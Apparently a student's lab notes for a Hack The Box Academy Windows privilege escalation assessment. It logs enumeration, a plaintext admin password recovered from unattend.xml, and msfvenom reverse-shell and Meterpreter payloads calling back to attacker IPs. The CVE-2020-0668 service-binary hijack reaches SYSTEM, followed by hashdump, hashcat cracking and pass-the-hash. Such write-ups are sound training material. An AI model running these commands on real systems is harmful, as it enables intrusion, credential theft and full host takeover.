# Windows Privilege Escalation Skills Assessment - Part II

xfreerdp /v:10.129.43.33 /u:"htb-student" /p:"HTB_@cademy_stdnt!"

ipconfig /all

   IPv4 Address. . . . . . . . . . . : 10.129.43.33(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0

arp -a

Interface: 10.129.43.33 --- 0x7
  Internet Address      Physical Address      Type
  10.129.0.1            00-50-56-b9-f3-62     dynamic
  10.129.172.218        00-50-56-b9-ad-78     dynamic
  10.129.205.250        00-50-56-b9-25-9f     dynamic
  10.129.224.74         00-50-56-b9-43-fb     dynamic
  10.129.255.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static

route print

route print
===========================================================================
Interface List
  7...00 50 56 b9 24 69 ......vmxnet3 Ethernet Adapter
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0       10.129.0.1     10.129.43.33     15
       10.129.0.0      255.255.0.0         On-link      10.129.43.33    271
     10.129.43.33  255.255.255.255         On-link      10.129.43.33    271
   10.129.255.255  255.255.255.255         On-link      10.129.43.33    271
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0

Get-MpComputerStatus


AMEngineVersion                 : 1.1.18400.4
AMProductVersion                : 4.18.2106.6
AMRunningMode                   : Normal
AMServiceEnabled                : True

Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone

FilePath                      PolicyDecision MatchingRule
--------                      -------------- ------------
C:\Windows\System32\cmd.exe AllowedByDefault

tasklist /svc

SecurityHealthHost.exe        4012 N/A
ShellExperienceHost.exe        880 N/A
RuntimeBroker.exe             7280 N/A
tasklist.exe                  6868 N/A

set

Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\htb-student\AppData\Local\Microsoft\WindowsApps;
SystemDrive=C:
SystemRoot=C:\Windows
TEMP=C:\Users\HTB-ST~1\AppData\Local\Temp
TMP=C:\Users\HTB-ST~1\AppData\Local\Temp
USERDOMAIN=ACADEMY-WINLPE-
USERDOMAIN_ROAMINGPROFILE=ACADEMY-WINLPE-
USERNAME=htb-student

systeminfo

Host Name:                 ACADEMY-WINLPE-
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.18363 N/A Build 18363
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          mrb3n
Hotfix(s):                 8 Hotfix(s) Installed.
                           [01]: KB5003256
                           [02]: KB4513661
                           [03]: KB4516115
                           [04]: KB4517245
                           [05]: KB4528759
                           [06]: KB4577586
                           [07]: KB5003244
                           [08]: KB4528760

wmic product get name
Name
Microsoft Visual C++ 2022 X64 Additional Runtime - 14.36.32532
Microsoft Visual C++ 2022 X86 Additional Runtime - 14.36.32532
Microsoft Visual C++ 2022 X86 Minimum Runtime - 14.36.32532
VMware Tools
Microsoft Update Health Tools
Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.36.32532


query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>htb-student           rdp-tcp#0           2  Active          .  2/7/2024 2:35 PM


whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON  Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192

net user

User accounts for \\ACADEMY-WINLPE-

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
htb-student              mrb3n                    WDAGUtilityAccount
wksadmin
The command completed successfully.


net localgroup

Aliases for \\ACADEMY-WINLPE-

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Administrators
*Backup Operators
*Cryptographic Operators
*Device Owners
*Distributed COM Users
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Remote Desktop Users
*Remote Management Users
*Replicator
*System Managed Accounts Group
*Users
The command completed successfully.

net accounts
Force user logoff how long after time expires?:       Never
Minimum password age (days):                          0
Maximum password age (days):                          Unlimited
Minimum password length:                              0
Length of password history maintained:                None
Lockout threshold:                                    Never
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        WORKSTATION
The command completed successfully.

netstat -ano

  UDP    127.0.0.1:1900         *:*                                    5596
  UDP    127.0.0.1:54483        *:*                                    5596
  UDP    127.0.0.1:57088        *:*                                    3436
  UDP    [::1]:1900             *:*                                    5596
  UDP    [::1]:54481            *:*                                    5596

gci \\.\pipe\lsass

    Directory: \\.\pipe


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------       12/31/1600   4:00 PM              0 lsass

findstr /si iamtheadministrator *.xml *.ini *.txt *.config

Windows\Panther\unattend.xml:<FullName>INLANEFREIGHT\iamtheadministrator</FullName>
Windows\Panther\unattend.xml:<Username>INLANEFREIGHT\iamtheadministrator</Username>
Windows\Panther\unattend.xml:<DisplayName>INLANEFREIGHT\iamtheadministrator</DisplayName>
Windows\Panther\unattend.xml:<Name>INLANEFREIGHT\iamtheadministrator</Name>
Windows\Panther\unattend.xml:<RegisteredOwner>INLANEFREIGHT\iamtheadministrator</RegisteredOwner>
Windows\Panther\unattend.xml:<CommandLine>cmd /C wmic useraccount where name="INLANEFREIGHT\iamtheadministrator" set PasswordExpires=false</CommandLine>

type Windows\Panther\unattend.xml

<ComputerName>WS001904</ComputerName>
<ProductKey>W269N-WFGWX-YVC9B-4J6C9-T83GX</ProductKey>
</component>
</settings>
<settings pass="oobeSystem">
<component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<AutoLogon>
<Password>
<Value>Inl@n3fr3ight_sup3rAdm1n!</Value>
<PlainText>true</PlainText>
</Password>
<Enabled>false</Enabled>
<Username>INLANEFREIGHT\iamtheadministrator</Username>
</AutoLogon>

net localgroup "Event Log Readers"
Alias name     Event Log Readers
Comment        Members of this group can read event logs from local machine

Members

-------------------------------------------------------------------------------
The command completed successfully.

wevtutil qe Security /rd:true /f:text | Select-String "/user"
Access is denied.

Failed to open event query.
Access is denied.

Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
Get-WinEvent : Could not retrieve information about the Security log. Error: Attempted to perform an unauthorized
operation..

c:\Windows\System32>sc start dns
[SC] StartService: OpenService FAILED 1060:

The specified service does not exist as an installed service.

### Try to abuse Print Operators but failed because unable to compile exploit on target

wget https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp

#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"

sudo impacket-smbserver share -smb2support /tmp/smbshare

copy \\10.10.15.26\share\EnableSeLoadDriverPrivilege.cpp

organization's security policies block unauthenticated guest access

sudo impacket-smbserver share -smb2support /home/htb-ac-786011/ -user test -password test

c:\Users\htb-student>net use n: \\10.10.15.26\share /user:test test
The command completed successfully.

c:\Users\htb-student>copy n:\EnableSeLoadDriverPrivilege.cpp
        1 file(s) copied.

git clone https://github.com/FuzzySecurity/Capcom-Rootkit

copy n:\Capcom-Rootkit\Driver\Capcom.sys

c:\Users\htb-student>reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Users\htb-student\Capcom.sys"
The operation completed successfully.

c:\Users\htb-student>reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
The operation completed successfully.

https://www.pconlife.com/download/otherfile/15667/b5307913aedd87eddbc2e383f1629e6a/

copy n:\cl.exe

findstr /si cl *.exe

dir /S /B cl.exe

copy n:\VSCode-win32-x64-1.86.0.zip

copy n:\VisualStudioSetup.exe

--> Installation failed due to need of administrator rights

### Abuse UAC

whoami /user

USER INFORMATION
----------------

User Name                   SID
=========================== ==============================================
academy-winlpe-\htb-student S-1-5-21-1961621466-3413676743-2436262688-1002

net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
mrb3n
wksadmin
The command completed successfully.

whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1

REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x0

[environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      18363  0

cmd /c echo %PATH%
C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\htb-student\AppData\Local\Microsoft\WindowsApps;

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.26 LPORT=8443 -f dll > srrstr.dll
nc -lvnp 8443

copy n:\srrstr.dll

move srrstr.dll C:\Users\htb-student\AppData\Local\Microsoft\WindowsApps\srrstr.dll

rundll32 shell32.dll,Control_RunDLL C:\Users\htb-student\AppData\Local\Microsoft\WindowsApps\srrstr.dll

C:\Users\htb-student>whoami
whoami
academy-winlpe-\htb-student

C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
Access is denied.

reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /t REG_DWORD /v DisableRestrictedAdmin /d 0x5 /f
ERROR: Access is denied.

### winPeas

git clone https://github.com/carlospolop/PEASS-ng/
cat PEASS-ng/winPEAS/winPEASps1/winPEAS.ps1

copy n:\PEASS-ng\winPEAS\winPEASps1\winPEAS.ps1

### HHUPD

https://github.com/jas502n/CVE-2019-1388

https://nvd.nist.gov/vuln/detail/CVE-2019-1388

Link of list of vulnerable servers and workstations :
https://web.archive.org/web/20210620053630/https://gist.github.com/gentilkiwi/802c221c0731c06c22bb75650e884e5a

1) Uploading an old-Microsoft-signed executable

git clone https://github.com/jas502n/CVE-2019-1388

net use n: \\10.10.15.26\share /user:test test
copy n:\CVE-2019-1388\HHUPD.EXE

https://packetstormsecurity.com/files/14437/hhupd.exe.html
copy n:\hhupd.exe

--> no hyperlink

### UAC Disbaled ?

UAC disabled
If UAC is already disabled (ConsentPromptBehaviorAdmin is 0) you can execute a reverse shell with admin privileges (high integrity level) using something like:
#Put your reverse shell instead of "calc.exe"

Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.15.26 4444"

--> Failed SYSTEM ask administrator creds

### CVE-2020-0668

whoami /priv

icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                                          BUILTIN\Administrators:(I)(F)
                                                                          BUILTIN\Users:(I)(RX)
                                                                          APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                                          APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files


msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.60 LPORT=8443 -f exe > maintenanceservice.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 736 bytes
Final size of exe file: 7168 bytes

sudo impacket-smbserver share -smb2support /home/htb-ac-786011/ -user test -password test

c:\Users\htb-student>net use n: \\10.10.14.60\share /user:test test
The command completed successfully.

git clone https://github.com/bypazs/CVE-2020-0668.exe



c:\Users\htb-student>copy n:\CVE-2020-0668.exe\CVE-2020-0668.exe
        1 file(s) copied.

c:\Users\htb-student>copy n:\maintenanceservice.exe
        1 file(s) copied.

c:\Users\htb-student\CVE-2020-0668.exe c:\Users\htb-student\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"   

Unhandled Exception: System.IO.FileNotFoundException: Could not load file or assembly 'NtApiDotNet, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null' or one of its dependencies. The system cannot find the file specified.
   at CVE_2020_0668.Program.Main(String[] args)

CVE-2020-0668.exe
copy n:\CVE-2020-0668.exe\CVE-2020-0668.exe.config
copy n:\CVE-2020-0668.exe\CVE-2020-0668.pdb
copy n:\CVE-2020-0668.exe\NtApiDotNet.dll
copy n:\CVE-2020-0668.exe\NtApiDotNet.xml

move maintenanceservice.exe maintenanceservice2.exe

copy n:\maintenanceservice.exe

c:\Users\htb-student\CVE-2020-0668.exe c:\Users\htb-student\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

[+] Moving c:\Users\htb-student\maintenanceservice.exe to C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
[+] Mounting \RPC Control onto C:\Users\htb-student\AppData\Local\Temp\04z4pafb.22f
[+] Creating symbol links
[+] Updating the HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Tracing\RASPLAP configuration.
[+] Sleeping for 5 seconds so the changes take effect
[+] Writing phonebook file to C:\Users\htb-student\AppData\Local\Temp\7e6cf7ba-e367-40c0-b37f-7bd6cdffd251.pbk
[+] Cleaning up
[+] Done!

icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                                          BUILTIN\Administrators:(I)(F)
                                                                          ACADEMY-WINLPE-\htb-student:(I)(F)
                                                                          ACADEMY-WINLPE-\mrb3n:(I)(F)

Successfully processed 1 files; Failed processing 0 files

copy /Y C:\Users\htb-student\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

sudo msfconsole -q

use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 10.10.14.60
set LPORT 8443
exploit

net start MozillaMaintenance

(Meterpreter 1)(C:\Windows\system32) > getuid
Server username: NT AUTHORITY\SYSTEM

shell

cat c:\Users\Administrator\Desktop\flag.txt

(Meterpreter 5)(C:\Windows\system32) > hashdump

Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb-student:1002:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
mrb3n:1001:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:aad797e20ba0675bbcb3e3df3319042c:::
wksadmin:1003:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::

cat ntlm | awk -F":" '{print $4}' > ADMIN_NTLM

sudo hashcat -m 1000 ADMIN_NTLM /usr/share/wordlists/rockyou.txt

5835048ce94ad0564e29a924a03510ef:password1 

crackmapexec smb 10.129.43.33 -u Administrator -d . -H 7796ee39fd3a9c3a1844556115ae1a54

xfreerdp  /v:10.129.43.33 /u:Administrator /pth:7796ee39fd3a9c3a1844556115ae1a54
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
ERROR: Access is denied.


download c:\Users\Administrator\Desktop\flag.txt
dir c:\Users\Administrator\

cd c:\Users\Administrator\

ls c:\Users\Administrator\Desktop\

ls c:/Users/Administrator/Desktop/
download c:/Users/Administrator/Desktop/flag.txt

cat /home/htb-ac-786011/CVE-2020-0668.exe/flag.txt
el3vatEd_1nstall$_v3ry_r1sky